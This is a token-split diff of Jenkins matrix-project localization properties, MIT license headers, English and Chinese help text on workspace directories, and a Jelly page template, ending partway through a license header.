"\\", "Filter", "=", "Filtro", "combinado", "Axes", "=", "Eixos", "@", "@", "-", "1", ",", "33", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Mike", "Salnikov", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Advanced", "\\", "Project", "\\", "Options", "=", "\\", "u0420", "\\", "u0430", "\\", "u0441", "\\", "u0448", "\\", "u0438", "\\", "u0440", "\\", "u0435", "\\", "u043d", "\\", "u043d", "\\", "u044b", "\\", "u0435", "\\", "u043d", "\\", "u0430", "\\", "u0441", "\\", "u0442", "\\", "u0440", "\\", "u043e", "\\", "u0439", "\\", "u043a", "\\", "u0438", "\\", "u043f", "\\", "u0440", "\\", "u043e", "\\", "u0435", "\\", "u043a", "\\", "u0442", "\\", "u0430", "Configuration", "\\", "Matrix", "=", "\\", "u041c", "\\", "u0430", "\\", "u0442", "\\", "u0440", "\\", "u0438", "\\", "u0446", "\\", "u0430", "\\", "u043a", "\\", "u043e", "\\", "u043d", "\\", "u0444", "\\", "u0438", "\\", "u0433", "\\", "u0443", "\\", "u0440", "\\", "u0430", "\\", "u0446", "\\", "u0438", "\\", "u0439", "Build", "\\", "on", "\\", "multiple", "\\", "nodes", "=", "\\", "u0421", "\\", "u043e", "\\", "u0431", "\\", "u0438", "\\", "u0440", "\\", "u0430", "\\", "u0442", "\\", "u044c", "\\", "u043d", "\\", "u0430", "\\", "u043d", "\\", "u0435", "\\", "u0441", "\\", "u043a", "\\", "u043e", "\\", "u043b", "\\", "u044c", "\\", "u043a", "\\", "u0438", "\\", "u0445", "\\", "u0443", "\\", "u0437", "\\", "u043b", "\\", "u0430", "\\", "u0445", "Node", "=", "\\", "u0423", "\\", "u0437", "\\", "u0435", "\\", "u043b", "Name", "=", "\\", "u0418", "\\", "u043c", "\\", "u044f", "Values", "=", "\\", "u0417", "\\", "u043d", "\\", "u0430", "\\", "u0447", "\\", "u0435", "\\", "u043d", "\\", "u0438", "\\", "u044f", "Add", "\\", "more", "\\", "axis", "=", "\\", "u0414", "\\", "u043e", "\\", "u0431", "\\", "u0430", "\\", "u0432", "\\", "u0438", "\\", "u0442", "\\", "u044c", "\\", "u0441", "\\", "u0442", "\\", "u0435", "\\", "u043f", "\\", "u0435", "\\", "u043d", "\\", "u0438", "\\", "u0441", "\\", "u0432", "\\", "u043e", "\\", "u0431", "\\", "u043e", "\\", "u0434", "\\", "u044b", "Delete", "=", "\\", "u0423", "\\", "u0434", "\\", "u0430", "\\", "u043b", "\\", "u0438", "\\", "u0442", "\\", "u044c", "Individual", "\\", "nodes", "=", "\\", "u041a", "\\", "u043e", "\\", "u043d", "\\", "u043a", "\\", "u0440", "\\", "u0435", "\\", "u0442", "\\", "u043d", "\\", "u044b", "\\", "u0435", "\\", "u0443", "\\", "u0437", "\\", "u043b", "\\", "u044b", "Labels", "=", "\\", "u041c", "\\", "u0435", "\\", "u0442", "\\", "u043a", "\\", "u0438", "Axes", "=", "\\", "u041e", "\\", "u0441", "\\", "u0438", "@", "@", "-", "1", ",", "5", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Advanced", "\\", "Project", "\\", "Options", "=", "Pokro", "\\", "u010Dil", "\\", "u00E9", "nastavenia", "projektu", "Directory", "=", "Adres", "\\", "u00E1r", "Use", "\\", "custom", "\\", "workspace", "=", "Pou", "\\", "u017Ei", "vlastn", "\\", "u00FD", "pracovn", "\\", "u00FD", "priestor", "@", "@", "-", "1", ",", "5", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Advanced", "\\", "Project", "\\", "Options", "=", "Avancerade", "projektinst", "\\", "u00E4llningar", "Directory", "=", "Katalog", "Display", "\\", "Name", "=", "Visningsnamn", "@", "@", "-", "1", ",", "35", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Oguz", "Dag", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Advanced", "\\", "Project", "\\", "Options", "=", "Geli", "\\", "u015fmi", "\\", "u015f", "\\", "Proje", "\\", "Se", "\\", "u00e7enekleri", "Configuration", "\\", "Matrix", "=", "Konfig", "\\", "u00fcrasyon", "\\", "Matrisi", "Build", "\\", "on", "\\", "multiple", "\\", "nodes", "=", "\\", "u00c7oklu", "nod", "\\", "u00fczerinde", "yap", "\\", "u0131land", "\\", "u0131r", "Node", "=", "Nod", "Name", "=", "\\", "u0130sim", "Values", "=", "De", "\\", "u011ferler", "Add", "\\", "more", "\\", "axis", "=", "Eksen", "ekle", "Delete", "=", "Sil", "Individual", "\\", "nodes", "=", "Tek", "nodlar", "Labels", "=", "Etiketler", "Axes", "=", "Eksenler", "Filter", "\\", "Combinations", "=", "Kombinasyonlari", "Filtrele", "Filter", "=", "Filtre", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2013", ",", "Chunghwa", "Telecom", "Co", ".", ",", "Ltd", ".", ",", "Pei", "-", "Tang", "Huang", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Advanced", "\\", "Project", "\\", "Options", "=", "\\", "u9032", "\\", "u968e", "\\", "u5c08", "\\", "u6848", "\\", "u9078", "\\", "u9805", "Use", "\\", "custom", "\\", "workspace", "=", "\\", "u4f7f", "\\", "u7528", "\\", "u81ea", "\\", "u8a02", "\\", "u5de5", "\\", "u4f5c", "\\", "u5340", "Directory", "=", "\\", "u76ee", "\\", "u9304", "Directory", "\\", "for", "\\", "sub", "-", "builds", "=", "\\", "u5b50", "\\", "u5efa", "\\", "u7f6e", "\\", "u76ee", "\\", "u9304", "Display", "\\", "Name", "=", "\\", "u986f", "\\", "u793a", "\\", "u540d", "\\", "u7a31", "Configuration", "\\", "Matrix", "=", "\\", "u8a2d", "\\", "u5b9a", "\\", "u77e9", "\\", "u9663", "Add", "\\", "axis", "=", "\\", "u589e", "\\", "u52a0", "\\", "u8ef8", "\\", "u7dda", "Combination", "\\", "Filter", "=", "\\", "u7d44", "\\", "u5408", "\\", "u7be9", "\\", "u9078", "\\", "u689d", "\\", "u4ef6", "Filter", "=", "\\", "u7be9", "\\", "u9078", "\\", "u689d", "\\", "u4ef6", "Execution", "\\", "Strategy", "=", "\\", "u57f7", "\\", "u884c", "\\", "u7b56", "\\", "u7565", "@", "@", "-", "1", ",", "28", "+", "0", ",", "0", "@", "@", "<", "div", ">", "Override", "the", "workspace", "directory", "assigned", "to", "each", "configuration", "build", ".", "<", "p", ">", "By", "default", ",", "Jenkins", "runs", "each", "configuration", "build", "in", "its", "own", "unique", "directory", "(", "this", "happens", "by", "appending", "the", "name", "and", "the", "value", "of", "the", "axes", "to", "the", "workspace", "of", "the", "overall", "matrix", "execution", ",", "for", "example", ",", "<", "tt", ">", "/", "path", "/", "to", "/", "slaveroot", "/", "job", "/", "someMatrixJob", "/", "axis1", "/", "value1", "/", "axis2", "/", "value2", "/", "</", "tt", ">", ").", "Specifying", "this", "value", "allows", "you", "to", "override", "this", "behaviour", ".", "<", "p", ">", "A", "common", "value", "used", "here", "is", "\"", ".\"", ",", "indicating", "that", "all", "the", "configuration", "builds", "run", "on", "the", "same", "directory", "as", "the", "overall", "matrix", "execution", ".", "<", "p", ">", "The", "path", "specified", "here", "can", "be", "either", "absolute", "or", "relative", ".", "If", "relative", ",", "it", "is", "resolved", "against", "the", "workspace", "of", "the", "overall", "matrix", "execution", ".", "The", "value", "can", "also", "contains", "environment", "variable", "references", ".", "Environment", "variables", "include", "all", "the", "axis", "values", ",", "so", "for", "example", "if", "you", "specify", "<", "tt", ">", "$", "FOO", "<", "/", "tt", ">", "when", "you", "define", "two", "axes", "FOO", "=", "[", "a", ",", "b", "]", "and", "BAR", "=", "[", "x", ",", "y", "]", ",", "then", "FOO", "=", "a", ",", "BAR", "=", "x", "and", "FOO", "=", "a", ",", "BAR", "=", "y", "will", "build", "in", "somewhere", "like", "<", "tt", ">", "/", "slaveroot", "/", "job", "/", "someMatrixJob", "/", "a", "/", "</", "tt", ">", "while", "FOO", "=", "b", ",", "BAR", "=", "x", "and", "FOO", "=", "b", ",", "BAR", "=", "y", "will", "build", "in", "<", "tt", ">", "/", "slaveroot", "/", "job", "/", "someMatrixJob", "/", "b", "/", "</", "tt", ">", ".", "In", "this", "way", ",", "you", "can", "be", "selective", "about", "what", "subset", "of", "configuration", "builds", "share", "the", "same", "workspace", "and", "what", "doesn", "'", "t", ".", "<", "p", ">", "Environment", "variables", "include", "special", "tokens", "<", "tt", ">", "${", "COMBINATION", "}", "</", "tt", ">", ",", "which", "expands", "to", "<", "tt", ">", "axis1", "/", "value1", "/", "axis2", "/", "value2", "/", "..", ".<", "/", "tt", ">", ",", "and", "<", "tt", ">", "${", "SHORT_COMBINATION", "}", "</", "tt", ">", ",", "which", "expands", "to", "8", "character", "string", "unique", "to", "each", "configuration", ".", "<", "/", "div", ">", "<", "div", ">", "\u91cd", "\u65b0\u6307", "\u5b9a\u6bcf", "\u7d44\u8a2d", "\u5b9a\u7684", "\u5efa\u7f6e", "\u5de5\u4f5c", "\u5340\u76ee", "\u9304\u3002", "<", "p", ">", "Jenkins", "\u9810", "\u8a2d\u6703", "\u7d66\u5404", "\u7a2e\u4e0d", "\u540c\u8a2d", "\u5b9a\u7368", "\u7acb\u7684", "\u76ee\u9304", "(", "\u5728\u77e9", "\u9663\u57f7", "\u884c\u6642", "\u5c07\u5ea7", "\u6a19\u503c", "\u52a0\u5230", "\u5de5\u4f5c", "\u5340\u76ee", "\u9304\u4e2d", "\uff0c\u4f8b", "\u5982", "<", "tt", ">", "/", "path", "/", "to", "/", "slaveroot", "/", "job", "/", "someMatrixJob", "/", "axis1", "/", "value1", "/", "axis2", "/", "value2", "/", "</", "tt", ">", ")\u3002", "Specifying", "this", "value", "allows", "you", "to", "override", "this", "behaviour", ".", "<", "p", ">", "\u5f88", "\u591a\u4eba", "\u6703\u8a2d", "\u5b9a\u70ba", "\"", ".\"", "\uff0c\u8b93", "\u77e9\u9663", "\u88e1\u7684", "\u6bcf\u4e00", "\u9805\u8a2d", "\u5b9a\u90fd", "\u5728\u540c", "\u4e00\u500b", "\u76ee\u9304", "\u88e1\u5efa", "\u7f6e\u3002", "<", "p", ">", "\u53ef", "\u4ee5\u4f7f", "\u7528\u76f8", "\u5c0d\u8def", "\u5f91\u6216", "\u662f\u7d55", "\u5c0d\u8def", "\u5f91\u3002", "\u76f8\u5c0d", "\u8def\u5f91", "\u662f\u7531", "\u6574\u500b", "\u77e9\u9663", "\u7684\u5de5", "\u4f5c\u5340", "\u8d77\u7b97", "\u3002", "\u74b0", "\u5883\u8b8a", "\u6578\u5305", "\u542b\u6240", "\u6709\u8ef8", "\u7dda\u7684", "\u503c\uff0c", "\u5047\u8a2d", "\u60a8\u8a2d", "\u5b9a", "FOO", "=", "[", "a", ",", "b", "]", "\u8ddf", "BAR", "=", "[", "x", ",", "y", "]", "\u5169", "\u500b\u8ef8", "\uff0c\u6307", "\u5b9a", "<", "tt", ">", "$", "FOO", "<", "/", "tt", ">", "\u6642", "\uff0c", "FOO", "=", "a", ",", "BAR", "=", "x", "\u53ca", "FOO", "=", "a", ",", "BAR", "=", "y", "\u6703", "\u5728", "<", "tt", ">", "/", "slaveroot", "/", "job", "/", "someMatrixJob", "/", "a", "/", "</", "tt", ">", "\u9019", "\u985e\u7684", "\u76ee\u9304", "\u4e2d\u5efa", "\u7f6e;", "\u800c", "FOO", "=", "b", ",", "BAR", "=", "x", "\u53ca", "FOO", "=", "b", ",", "BAR", "=", "y", "\u5247", "\u662f\u5728", "<", "tt", ">", "/", "slaveroot", "/", "job", "/", "someMatrixJob", "/", "b", "/", "</", "tt", ">", "\u5efa", "\u7f6e\u3002", "\u900f", "\u904e\u9019", "\u500b\u65b9", "\u5f0f\uff0c", "\u60a8\u53ef", "\u4ee5\u6c7a", "\u5b9a\u54ea", "\u4e9b\u8a2d", "\u5b9a\u8981", "\u5171\u7528", "\u5de5\u4f5c", "\u5340\uff0c", "\u54ea\u4e9b", "\u8a2d\u5b9a", "\u53c8\u5fc5", "\u9700\u7368", "\u7acb\u958b", "\u4f86\u3002", "<", "p", ">", "\u9084", "\u6709\u4e00", "\u4e9b\u7279", "\u6b8a\u74b0", "\u5883\u8b8a", "\u6578\u53ef", "\u7528\uff0c", "\u4f8b\u5982", ":", "<", "tt", ">", "${", "COMBINATION", "}", "</", "tt", ">", "\u6703", "\u88ab\u5c55", "\u958b\u6210", "<", "tt", ">", "axis1", "/", "value1", "/", "axis2", "/", "value2", "/", "..", ".<", "/", "tt", ">", "\uff0c", "\u9084", "\u6709", "<", "tt", ">", "${", "SHORT_COMBINATION", "}", "</", "tt", ">", "\uff0c\u6703", "\u88ab\u5c55", "\u958b\u6210", "\u6bcf\u7d44", "\u8a2d\u5b9a", "\u90fd\u4e0d", "\u540c\u7684", "8", "\u5b57", "\u5143\u5b57", "\u4e32\u3002", "<", "/", "div", ">", "<", "div", ">", "A", "matrix", "project", "needs", "to", "first", "execute", "what", "we", "call", "the", "\"", "parent", "build", "\"", ",", "which", "checks", "out", "a", "copy", "of", "the", "source", "tree", "and", "capture", "its", "state", "to", "ensure", "all", "the", "individual", "builds", "will", "check", "out", "the", "same", "state", ".", "<", "p", ">", "If", "you", "need", "to", "control", "where", "this", "parent", "build", "runs", ",", "please", "use", "this", "option", "to", "specify", "its", "label", "/", "slave", ".", "<", "/", "div", ">", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Erik", "Ramfelt", ",", "Tom", "Huybrechts", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "d", "=", "\"", "jelly", ":", "define", "\"", "xmlns", ":", "l", "=", "\"/", "lib", "/", "layout", "\"", "xmlns", ":", "t", "=", "\"/", "lib", "/", "hudson", "\"", "xmlns", ":", "f", "=", "\"/", "lib", "/", "form", "\"", "xmlns", ":", "i", "=", "\"", "jelly", ":", "fmt", "\"", "xmlns", ":", "p", "=", "\"/", "lib", "/", "hudson", "/", "project", "\"", ">", "<", "l", ":", "layout", "title", "=", "\"$", "{", "it", ".", "name", "}", "\">", "<", "st", ":", "include", "page", "=", "\"", "sidepanel", ".", "jelly", "\"", "/", ">", "<", "l", ":", "main", "-", "panel", ">", "<", "h1", "class", "=", "\"", "matrix", "-", "project", "-", "headline", "page", "-", "headline", "\"", ">$", "{%", "Project", "}", "<", "l", ":", "breakable", "value", "=", "\"$", "{", "it", ".", "displayName", "}", "\"/", "><", "/", "h1", ">", "<", "j", ":", "if", "test", "=", "\"$", "{", "it", ".", "name", "!", "=", "it", ".", "displayName", "}", "\">", "$", "{%", "Project", "name", "}", ":", "$", "{", "it", ".", "fullName", "}", "<", "/", "j", ":", "if", ">", "<", "t", ":", "editableDescription", "permission", "=", "\"$", "{", "it", ".", "CONFIGURE", "}", "\"/", ">", "<", "st", ":", "include", "page", "=", "\"", "makeDisabled", ".", "jelly", "\"", "/", ">", "<", "st", ":", "include", "page", "=", "\"", "ajaxMatrix", ".", "jelly", "\"", "/", ">", "<", "p", ":", "projectActionFloatingBox", "/", ">", "<", "table", "style", "=", "\"", "margin", "-", "top", ":", "1em", ";", "margin", "-", "left", ":", "1em", ";", "\">", "<", "j", ":", "set", "var", "=", "\"", "atr", "\"", "value", "=", "\"$", "{", "it", ".", "lastCompletedBuild", ".", "aggregatedTestResultAction", "}", "\"/", ">", "<", "j", ":", "if", "test", "=", "\"$", "{", "atr", "!", "=", "null", "}", "\">", "<", "t", ":", "summary", "icon", "=", "\"", "clipboard", ".", "png", "\"", ">", "<", "a", "href", "=", "\"", "lastCompletedBuild", "/", "testReport", "/", "\"", "class", "=", "\"", "model", "-", "link", "inside", "\"", ">$", "{%", "Latest", "Test", "Result", "}", "</", "a", ">", "<", "t", ":", "test", "-", "result", "it", "=", "\"$", "{", "atr", "}", "\"", "/", ">", "<", "/", "t", ":", "summary", ">", "<", "/", "j", ":", "if", ">", "<", "/", "table", ">", "<", "st", ":", "include", "page", "=", "\"", "jobpropertysummaries", ".", "jelly", "\"", "/", ">", "<", "!-", "-", "merge", "fragments", "from", "the", "actions", "-", "->", "<", "j", ":", "forEach", "var", "=", "\"", "a", "\"", "items", "=", "\"$", "{", "it", ".", "allActions", "}", "\">", "<", "st", ":", "include", "page", "=", "\"", "jobMain", ".", "jelly", "\"", "it", "=", "\"$", "{", "a", "}", "\"", "optional", "=", "\"", "true", "\"", "/", ">", "<", "/", "j", ":", "forEach", ">", "<", "p", ":", "upstream", "-", "downstream", "/", ">", "<", "/", "l", ":", "main", "-", "panel", ">", "<", "/", "l", ":", "layout", ">", "<", "/", "j", ":", "jelly", ">", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Project", "=", "\\", "u0627", "\\", "u0644", "\\", "u0645", "\\", "u0634", "\\", "u0631", "\\", "u0648", "\\", "u0639", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Project", "=", "Projekt", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "Kohsuke", "Kawaguchi", ".", "Knud", "Poulsen", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Project", "=", "Projekt", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Simon", "Wiest", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", 